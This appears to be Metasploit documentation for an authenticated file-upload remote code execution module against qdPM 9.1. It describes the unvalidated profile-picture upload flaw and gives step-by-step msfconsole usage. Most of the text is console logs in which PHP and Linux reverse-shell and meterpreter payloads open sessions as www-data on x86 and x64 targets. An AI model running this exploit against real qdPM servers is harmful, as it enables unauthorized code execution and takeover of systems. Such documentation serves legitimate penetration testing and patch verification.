## Vulnerable Application

This module exploits a arbitrary file upload vulnerability in the qdPM web-based project manager software, in its 9.1 version. When updating a user's profile (POST `myAccoutnt/update`), the user is allowed to upload a profile picture, which is stored in a known location under the web server root. The software fails to verify the picture input, allowing for the upload of any file, with any filename extension. This can be eploited by uploading a PHP script and invoking it by making a request to it. 
The script will run with the same privileges as the web server.
The module has been tested against qdPM version 9.1

## Verification Steps

- [ ] Start `msfconsole`
- [ ] `use exploit/multi/http/qdpm_authenticated_rce`
- [ ] `set EMAIL <email>`
- [ ] `set PASSWORD <password>`
- [ ] `set TARGETURI <target_uri>`
- [ ] `set RHOST <rhost>`
- [ ] `set RPORT <rport>`
- [ ] `exploit`
- [ ] Add SSL, Proxy, and VHOST options if needed.
- [ ] Verify that a new session is created.

## Options

  **EMAIL**
  [Required]
  The email of the user you want to exploit the software with. The user must NOT be the original Admin (i.e. the account created upon installing qdPM, `admin@your_domain.com`). The original Admin user does not have the same attributes as the other user created later on, and its profile picture cannot be changed. In fact, it has no profile picure nor a `/myAccount` page altogether. If you only have credentials for the original admin, you can always login and create another regular user to run this exploit. Note that users with Admin role are also exploitable, only the one created upon installation is not.

  **PASSWORD**
  [Required]
  The password of the user you are trying to exploit.

  **TARGETURI**
  The path qdPM lives at. This is only needed is qdPM is not served from the webserver root folder.

## Scenarios

As it can be shown by the following scenarios, the exploit works reliably against a variety of targets. The exploit, however, might fail when a large payload (i.e. stageless meterpreter) is selected.

  **Attacking with a generic PHP payload, OS independed**
    ```
    [msf](Jobs:0 Agents:0) exploit(multi/http/qdpm_authenticated_rce) >> set target Generic\ (PHP\ Payload)
    target => Generic (PHP Payload)
    [msf](Jobs:0 Agents:0) exploit(multi/http/qdpm_authenticated_rce) >> set payload php/meterpreter/reverse_tcp
    payload => php/meterpreter/reverse_tcp
    [msf](Jobs:0 Agents:0) exploit(multi/http/qdpm_authenticated_rce) >> exploit

    [*] Started reverse TCP handler on 192.168.2.177:4444
    [*] Attempt to login with 'johndoe@localhost.com:easyone'
    [*] Uploading PHP payload (1123 bytes)...
    [*] Executing 'JGvak.php'
    [*] Sending stage (39927 bytes) to 192.168.2.177
    [!] Removing: 993379-JGvak.php
    [*] Meterpreter session 2 opened (192.168.2.177:4444 -> 192.168.2.177:43816) at 2022-06-14 10:03:46 +0200

    (Meterpreter 1)(/home/giacomo/qdPM/uploads/users) > getuid
    Server username: www-data
    ```

**Attacking a Linux x86 target**

  Stageless meterpreter.

    ```
    [msf](Jobs:0 Agents:0) exploit(multi/http/qdpm_authenticated_rce) >> set target Linux\ x86
    target => Linux x86
    [msf](Jobs:0 Agents:0) exploit(multi/http/qdpm_authenticated_rce) >> set payload linux/x86/meterpreter_reverse_tcp
    [msf](Jobs:0 Agents:0) exploit(multi/http/qdpm_authenticated_rce) >> exploit
    
    [*] Started reverse TCP handler on 192.168.2.177:4444
    [*] Attempt to login with 'johndoe@localhost.com:easyone'
    [*] Uploading PHP payload (1481231 bytes)...
    [-] Unable to upload
    [*] Exploit completed, but no session was created.
    ```

  Stageless reverse TCP shell.

    ```
    [msf](Jobs:0 Agents:0) exploit(multi/http/qdpm_authenticated_rce) >> set target Linux\ x86
    target => Linux x86
    [msf](Jobs:0 Agents:0) exploit(multi/http/qdpm_authenticated_rce) >> set payload linux/x86/shell_reverse_tcp
    payload => linux/x86/shell_reverse_tcp
    [msf](Jobs:0 Agents:0) exploit(multi/http/qdpm_authenticated_rce) >> exploit
    
    [*] Started reverse TCP handler on 192.168.2.177:4444
    [*] Attempt to login with 'johndoe@localhost.com:easyone'
    [*] Uploading PHP payload (1911 bytes)...
    [*] Executing 'TyqPX.php'
    [!] Removing: 430547-TyqPX.php
    [*] Command shell session 3 opened (192.168.2.177:4444 -> 192.168.2.177:43818) at 2022-06-14 10:09:19 +0200
    
    whoami
    www-data
    ```

  Staged meterpreter
    
    ```
    [msf](Jobs:0 Agents:0) exploit(multi/http/qdpm_authenticated_rce) >> set target Linux\ x86
    target => Linux x86
    [msf](Jobs:0 Agents:0) exploit(multi/http/qdpm_authenticated_rce) >> set payload linux/x86/meterpreter/reverse_tcp
    payload => linux/x86/meterpreter/reverse_tcp
    [msf](Jobs:0 Agents:0) exploit(multi/http/qdpm_authenticated_rce) >> exploit
    
    [*] Started reverse TCP handler on 192.168.2.177:4444
    [*] Attempt to login with 'johndoe@localhost.com:easyone'
    [*] Uploading PHP payload (1940 bytes)...
    [*] Executing 'koTYT.php'
    [*] Sending stage (989032 bytes) to 192.168.2.177
    [!] Removing: 776342-koTYT.php
    [*] Meterpreter session 4 opened (192.168.2.177:4444 -> 192.168.2.177:43820) at 2022-06-14 10:20:21 +0200
    
    (Meterpreter 1)(/home/giacomo/qdPM/uploads/users) > getuid
    Server username: www-data
    ```

    Staged reverse TCP shell

    ```
    [msf](Jobs:0 Agents:0) exploit(multi/http/qdpm_authenticated_rce) >> set payload linux/x86/shell/reverse_tcp
    payload => linux/x86/shell/reverse_tcp
    [msf](Jobs:0 Agents:0) exploit(multi/http/qdpm_authenticated_rce) >> exploit
    
    [*] Started reverse TCP handler on 192.168.2.177:4444
    [*] Attempt to login with 'johndoe@localhost.com:easyone'
    [*] Uploading PHP payload (1978 bytes)...
    [*] Executing 'sfePF.php'
    [*] Sending stage (36 bytes) to 192.168.2.177
    [!] Removing: 666994-sfePF.php
    [*] Command shell session 5 opened (192.168.2.177:4444 -> 192.168.2.177:43822) at 2022-06-14 10:22:38 +0200
    
    whoami
    www-data
    ```

**Attacking a Linux x64 target**
  
  Stageless meterpreter

    ```
    [msf](Jobs:0 Agents:0) exploit(multi/http/qdpm_authenticated_rce) >> set target Linux\ x64
    target => Linux x64
    [msf](Jobs:0 Agents:0) exploit(multi/http/qdpm_authenticated_rce) >> set payload linux/x64/meterpreter_reverse_tcp
    payload => linux/x64/meterpreter_reverse_tcp
    [msf](Jobs:0 Agents:0) exploit(multi/http/qdpm_authenticated_rce) >> exploit
    
    [*] Started reverse TCP handler on 192.168.2.177:4444
    [*] Attempt to login with 'johndoe@localhost.com:easyone'
    [*] Uploading PHP payload (1394916 bytes)...
    [-] Unable to upload
    [*] Exploit completed, but no session was created.
    ```
  
  Stageless reverse TCP shell

    ```
    [msf](Jobs:0 Agents:0) exploit(multi/http/qdpm_authenticated_rce) >> set target Linux\ x64
    target => Linux x64
    [msf](Jobs:0 Agents:0) exploit(multi/http/qdpm_authenticated_rce) >> set payload linux/x64/shell_reverse_tcp
    payload => linux/x64/shell_reverse_tcp
    [msf](Jobs:0 Agents:0) exploit(multi/http/qdpm_authenticated_rce) >> exploit
    
    [*] Started reverse TCP handler on 192.168.2.177:4444
    [*] Attempt to login with 'johndoe@localhost.com:easyone'
    [*] Uploading PHP payload (1978 bytes)...
    [*] Executing 'SXyvv.php'
    [!] Removing: 938792-SXyvv.php
    [*] Command shell session 6 opened (192.168.2.177:4444 -> 192.168.2.177:43824) at 2022-06-14 10:25:54 +0200
    
    whoami
    www-data
    ```

  Staged meterpreter

    ```
    [msf](Jobs:0 Agents:0) exploit(multi/http/qdpm_authenticated_rce) >> set target Linux\ x64
    target => Linux x64
    [msf](Jobs:0 Agents:0) exploit(multi/http/qdpm_authenticated_rce) >> set payload linux/x64/meterpreter/reverse_tcp
    payload => linux/x64/meterpreter/reverse_tcp
    [msf](Jobs:0 Agents:0) exploit(multi/http/qdpm_authenticated_rce) >> exploit
    
    [*] Started reverse TCP handler on 192.168.2.177:4444
    [*] Attempt to login with 'johndoe@localhost.com:easyone'
    [*] Uploading PHP payload (2028 bytes)...
    [*] Executing 'RJAVK.php'
    [*] Sending stage (3020772 bytes) to 192.168.2.177
    [!] Removing: 192508-RJAVK.php
    [*] Meterpreter session 7 opened (192.168.2.177:4444 -> 192.168.2.177:43826) at 2022-06-14 10:26:52 +0200
    
    (Meterpreter 1)(/home/giacomo/qdPM/uploads/users) > getuid
    Server username: www-data
    ```

  Staged reverse TCP shell

    ```
    [msf](Jobs:0 Agents:0) exploit(multi/http/qdpm_authenticated_rce) >> set payload linux/x64/shell/reverse_tcp
    payload => linux/x64/shell/reverse_tcp
    [msf](Jobs:0 Agents:0) exploit(multi/http/qdpm_authenticated_rce) >> exploit
    
    [*] Started reverse TCP handler on 192.168.2.177:4444
    [*] Attempt to login with 'johndoe@localhost.com:easyone'
    [*] Uploading PHP payload (2067 bytes)...
    [*] Executing 'NkTZj.php'
    [*] Sending stage (38 bytes) to 192.168.2.177
    [!] Removing: 531068-NkTZj.php
    [*] Command shell session 8 opened (192.168.2.177:4444 -> 192.168.2.177:43828) at 2022-06-14 10:28:12 +0200
    
    whoami
    www-data
    ```
